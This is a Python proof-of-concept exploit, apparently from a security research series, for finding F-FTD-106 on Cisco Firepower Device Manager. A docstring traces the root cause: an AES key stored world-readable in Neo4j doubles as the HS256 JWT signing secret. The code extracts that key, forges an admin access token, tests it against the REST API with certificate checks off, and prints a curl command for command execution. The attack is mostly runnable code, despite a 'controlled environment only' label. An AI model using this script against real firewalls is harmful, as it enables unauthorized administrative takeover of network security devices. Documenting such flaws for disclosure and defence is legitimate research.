"""
F-FTD-106: FDM JWT token forgery via Neo4j-derived HS256 signing key
CONTROLLED ENVIRONMENT ONLY

Root cause chain (F-FTD-97 → F-FTD-102 → F-FTD-106):
  The AES-128 key stored world-readable in Neo4j (F-FTD-102) is the SAME key
  used as the HS256 HMAC signing secret for all FDM JWT access tokens.

  FDMJwtBuilder.getSecret() bytecode:
    invokestatic EncryptionUtil.getEncryptionKeyBytesFromCache():()[B
    areturn
  FDMJwtBuilder.generateJwsToken():
    invokevirtual getSecret():[B
    invokeinterface JwtBuilder.signWith(SignatureAlgorithm.HS256, secret)
  FDMJwtBuilder.parseAndValidateJwsToken():
    Jwts.parser().setSigningKey(getSecret()).require("tokenType","JWT_Access").parse(token)

  EncryptionKeyBootstrap stores the key in Neo4j as:
    SerializationKey node, UUID 6adc7474-37f8-482b-a9d2-8e0e34d1628a
    Property: "key" = base64(16-byte AES key)
    File: /ngfw/var/lib/db/ngfw.db/neostore.propertystore.db.strings (world-readable)

  JWT claim requirements (from FDMJwtBuilder + NgfwTokenEnhancer analysis):
    - iss (issuer): "Cisco-FDM" (TokenParams.tokenIssuer default)
    - jti (JWT ID): UUID string
    - iat (issuedAt): epoch seconds
    - exp (expiration): epoch seconds
    - sub (subject): username
    - tokenType: "JWT_Access" (required by parseAndValidateJwsToken; ACCESS vs REFRESH gate)
    - origin: "password" (skip OAuthTokenRepository isValidCustomToken check — custom=True triggers DB lookup)
    - username: FDM username
    - userRole: Neo4j UserRole.name — must match UserRole node in graph
               UserRoleManager Cypher: MATCH (a:UserRole{name:{userRole}}) CALL cisco.permissions.populate(a)
               Retrieve via: AJP GET /identity/users (F-FTD-105) → user.userRole.name
    - userUuid: FDM user UUID (from /identity/users response)
    - accessTokenExpiresAt: milliseconds epoch (added by NgfwTokenEnhancer.enhance)
    - refreshCount: "0" (integer-as-string)
    - algorithm: HS256

  NgfwAccessTokenAuthProvider.authenticate() flow:
    1. NgfwAccessTokenAuth (with Bearer token) → jwtBuilder.parseAndValidateJwsToken(token, false, null)
    2. Validated → new NgfwAccessTokenAuth(token).setAuthenticated(true).setParsedToken(fdmJwsToken)
    3. NgfwRBACAccessVoter.vote() — checks NgfwUserRolesStore.getPermissionTypeForResource()
       The userRole from JWT must match a Neo4j UserRole node (populated at login cache-load time)

  Key source for userRole (two methods):
    a. Via F-FTD-105 (AJP local bypass):
       GET http://127.0.0.1:8009/api/fdm/v6/identity/users via AJP
       Response: [{"id":"...","username":"admin","userRole":{"name":"ADMIN"},...}]
    b. Via F-FTD-102 (Neo4j strings extraction):
       grep "UserRole\|ADMIN\|role" /ngfw/var/lib/db/ngfw.db/neostore.propertystore.db.strings

Attack chain:
  F-FTD-97 (Neo4j world-readable) → F-FTD-102 (AES key extract from Neo4j strings file)
  → F-FTD-106 (forge HS256 JWT with AES key as signing secret)
  → Authenticated FDM REST API access from NETWORK (not restricted to 127.0.0.1)
  → Full REST API admin: policy read/write, config export, user management, CLISH exec

Severity: CRITICAL
  Requires: local read access to Neo4j (F-FTD-102) OR admin credentials (key via /identity/users)
  Impact: forge admin access tokens valid from any network source
  Differs from F-FTD-105: F-FTD-105 requires local AJP reach; F-FTD-106 works from any network
  Novel: same key used for both password encryption AND JWT signing

References:
  FDMJwtBuilder.class: framework.jar — getSecret() → EncryptionUtil.getEncryptionKeyBytesFromCache
  NgfwAccessTokenAuthProvider.class: rest.jar — authenticate() → parseAndValidateJwsToken
  EncryptionKeyBootstrap.class: framework.jar — UUID 6adc7474-37f8-482b-a9d2-8e0e34d1628a
  FDMJwsToken.class: rest.jar — tokenType "JWT_Access"/"JWT_Refresh", claim accessors
  TokenParams.class: rest.jar — issuer "Cisco-FDM", origin "password"/"custom"
  UserRoleManager.class: users-crud.jar — Cypher: MATCH (a:UserRole{name:{userRole}})
"""

# CONTROLLED ENVIRONMENT ONLY

import argparse
import base64
import sys
import time
import uuid
from typing import Optional

FINDING = "F-FTD-106"
LABEL = "FDM JWT token forgery via Neo4j-derived HS256 signing key"

SERIALIZATION_KEY_UUID = "6adc7474-37f8-482b-a9d2-8e0e34d1628a"
ADMIN_USER_UUID = "c5a22f41-9c3b-11f1-a1e3-591e15734044"
NEO4J_STRINGS_FILE = "/ngfw/var/lib/db/ngfw.db/neostore.propertystore.db.strings"

DEFAULT_TOKEN_LIFETIME = 1800  # seconds (30 min — FDM default)
DEFAULT_ROLE = "ADMIN"
DEFAULT_USERNAME = "admin"
DEFAULT_ISSUER = "Cisco-FDM"
DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 443


def extract_aes_key_from_neo4j(strings_file: str) -> Optional[bytes]:
    """
    Extract AES-128 signing key from Neo4j property store strings file.
    Same extraction logic as F-FTD-102 — key is the same object.
    """
    import re
    try:
        with open(strings_file, 'rb') as f:
            content = f.read()
    except (PermissionError, FileNotFoundError) as e:
        print(f"[-] Cannot read {strings_file}: {e}")
        return None

    text = content.decode('latin-1', errors='replace')
    uuid_pos = text.find(SERIALIZATION_KEY_UUID)
    if uuid_pos == -1:
        print(f"[-] SerializationKey UUID not found in strings file")
        return None

    window = text[max(0, uuid_pos - 2048):uuid_pos + 2048]
    candidates = re.findall(r'[A-Za-z0-9+/]{22}==', window)
    for candidate in candidates:
        raw = base64.b64decode(candidate)
        if len(raw) == 16:
            print(f"[+] AES key extracted: {candidate}")
            return raw

    print(f"[-] 16-byte AES key not found near SerializationKey UUID")
    return None


def forge_fdm_jwt(key_bytes: bytes,
                  username: str = DEFAULT_USERNAME,
                  user_uuid: str = ADMIN_USER_UUID,
                  user_role: str = DEFAULT_ROLE,
                  issuer: str = DEFAULT_ISSUER,
                  lifetime: int = DEFAULT_TOKEN_LIFETIME,
                  origin: str = "password",
                  token_type: str = "JWT_Access") -> str:
    """
    Forge a valid FDM JWT access token signed with HS256.

    Claims structure from FDMJwtBuilder + NgfwTokenEnhancer analysis:
      Standard:  iss, jti, iat, exp, sub
      Custom:    tokenType, origin, username, userRole, userUuid, accessTokenExpiresAt, refreshCount
    """
    try:
        import jwt as pyjwt
    except ImportError:
        print("[-] PyJWT required: pip install PyJWT")
        sys.exit(1)

    now = int(time.time())
    exp = now + lifetime
    jti = str(uuid.uuid4())
    exp_ms = exp * 1000  # accessTokenExpiresAt in milliseconds (NgfwTokenEnhancer)

    payload = {
        # Standard JWT claims
        "iss": issuer,
        "jti": jti,
        "iat": now,
        "exp": exp,
        "sub": username,
        # FDM custom claims (NgfwTokenEnhancer.enhance)
        "tokenType": token_type,
        "origin": origin,
        "username": username,
        "userRole": user_role,
        "userUuid": user_uuid,
        "accessTokenExpiresAt": str(exp_ms),
        "refreshCount": "0",
    }

    token = pyjwt.encode(payload, key_bytes, algorithm="HS256")
    if isinstance(token, bytes):
        token = token.decode("utf-8")
    return token


def test_forged_token(token: str, host: str, port: int, endpoint: str = "/api/fdm/v6/identity/users",
                      verify_ssl: bool = False) -> dict:
    """Test forged token against target FDM REST API."""
    try:
        import urllib.request
        import ssl
        import json
    except ImportError:
        pass

    url = f"https://{host}:{port}{endpoint}"
    headers = {
        "Authorization": f"Bearer {token}",
        "Accept": "application/json",
        "Content-Type": "application/json",
    }

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    req = urllib.request.Request(url, headers=headers, method="GET")
    try:
        with urllib.request.urlopen(req, context=ctx, timeout=10) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            status = resp.status
            return {"status": status, "body": body[:500], "success": status == 200}
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        return {"status": e.code, "body": body[:200], "success": False}
    except Exception as e:
        return {"status": None, "body": str(e), "success": False}


def main() -> None:
    ap = argparse.ArgumentParser(description=f"{FINDING}: {LABEL}")
    ap.add_argument("--key", default=None,
                    help="AES-128 key as base64 string (from F-FTD-102 Neo4j extraction)")
    ap.add_argument("--key-file", default=None,
                    help="Path to Neo4j strings file to auto-extract key from")
    ap.add_argument("--username", default=DEFAULT_USERNAME,
                    help=f"FDM username for token (default: {DEFAULT_USERNAME})")
    ap.add_argument("--user-uuid", default=ADMIN_USER_UUID,
                    help=f"FDM user UUID (default: known admin UUID from Neo4j)")
    ap.add_argument("--user-role", default=DEFAULT_ROLE,
                    help=f"FDM userRole claim — must match Neo4j UserRole.name (default: {DEFAULT_ROLE})")
    ap.add_argument("--lifetime", type=int, default=DEFAULT_TOKEN_LIFETIME,
                    help=f"Token lifetime in seconds (default: {DEFAULT_TOKEN_LIFETIME})")
    ap.add_argument("--host", default=DEFAULT_HOST,
                    help=f"Target FDM HTTPS host (default: {DEFAULT_HOST})")
    ap.add_argument("--port", type=int, default=DEFAULT_PORT,
                    help=f"Target HTTPS port (default: {DEFAULT_PORT})")
    ap.add_argument("--endpoint", default="/api/fdm/v6/identity/users",
                    help="FDM API endpoint to test (default: /api/fdm/v6/identity/users)")
    ap.add_argument("--print-only", action="store_true",
                    help="Only print the forged token, do not send HTTP request")
    ap.add_argument("--no-verify", action="store_true", default=True,
                    help="Skip TLS certificate verification (always on for FTD self-signed)")
    args = ap.parse_args()

    print(f"[*] {FINDING}: {LABEL}")
    print("[!] CONTROLLED ENVIRONMENT ONLY")
    print("[!] Forged JWT provides authenticated FDM admin access from any network location")
    print()

    # Step 1: Get key
    key_bytes = None
    if args.key:
        key_bytes = base64.b64decode(args.key + "==")
        if len(key_bytes) != 16:
            print(f"[-] Key must be 16 bytes (got {len(key_bytes)})")
            sys.exit(1)
        print(f"[+] Using provided AES key ({len(key_bytes)} bytes)")
    elif args.key_file:
        print(f"[1] Extracting AES key from Neo4j strings file: {args.key_file}")
        key_bytes = extract_aes_key_from_neo4j(args.key_file)
    else:
        print(f"[1] Attempting to extract AES key from live VM Neo4j strings file...")
        key_bytes = extract_aes_key_from_neo4j(NEO4J_STRINGS_FILE)

    if not key_bytes:
        print("[-] No AES key available. Provide --key (base64) or --key-file (Neo4j strings path)")
        print(f"    Extract key via: python3 ftd_neo4j_password_decrypt.py --mode extract")
        print(f"    Expected file: {NEO4J_STRINGS_FILE}")
        sys.exit(1)

    # Step 2: Forge JWT
    print(f"\n[2] Forging JWT access token...")
    print(f"    username: {args.username}")
    print(f"    userRole: {args.user_role}  (must match Neo4j UserRole node)")
    print(f"    userUuid: {args.user_uuid}")
    print(f"    issuer:   {DEFAULT_ISSUER}")
    print(f"    lifetime: {args.lifetime}s")
    print(f"    algorithm: HS256")

    token = forge_fdm_jwt(
        key_bytes=key_bytes,
        username=args.username,
        user_uuid=args.user_uuid,
        user_role=args.user_role,
        lifetime=args.lifetime,
    )

    print(f"\n[+] FORGED TOKEN:")
    print(f"    {token}")
    print()
    print(f"    Authorization: Bearer {token}")

    if args.print_only:
        return

    # Step 3: Test token
    print(f"\n[3] Testing forged token against {args.host}:{args.port}{args.endpoint}...")
    result = test_forged_token(token, args.host, args.port, args.endpoint)

    print(f"    HTTP {result['status']}: {'SUCCESS' if result['success'] else 'FAILED'}")
    if result["body"]:
        print(f"    Response: {result['body'][:200]}")

    if result["success"]:
        print()
        print(f"[!] FINDING CONFIRMED: Forged JWT accepted — authenticated API access achieved")
        print(f"    userRole '{args.user_role}' is valid — exists as Neo4j UserRole node")
        print(f"    Full FDM REST API accessible from network with forged token")
        print()
        print(f"    Command execution via forged token:")
        print(f'      curl -sk -H "Authorization: Bearer {token[:30]}..." \\')
        print(f'           -H "Content-Type: application/json" \\')
        print(f'           -d \'{{"commandInput":"show version","timeOut":30}}\' \\')
        print(f'           https://{args.host}:{args.port}/api/fdm/v6/action/command')
    elif result["status"] == 401:
        print()
        print(f"[-] 401 — token rejected. Possible causes:")
        print(f"    1. Wrong userRole ('{args.user_role}' doesn't match Neo4j UserRole node)")
        print(f"       Try: ADMIN, READ_ONLY, ANALYST, Administrator — or extract from /identity/users via AJP")
        print(f"    2. Wrong AES key (key changed since Neo4j snapshot)")
        print(f"    3. Token claims mismatch — inspect with: python3 -c \"import jwt; print(jwt.decode('{token[:20]}...', options={{'verify_signature':False}}))\"")
    elif result["status"] == 403:
        print()
        print(f"[-] 403 — token valid but access denied to endpoint {args.endpoint}")
        print(f"    Role '{args.user_role}' may be READ_ONLY — try ADMIN or higher role")
        print(f"    Or: try a different endpoint that the role can access")


if __name__ == "__main__":
    main()
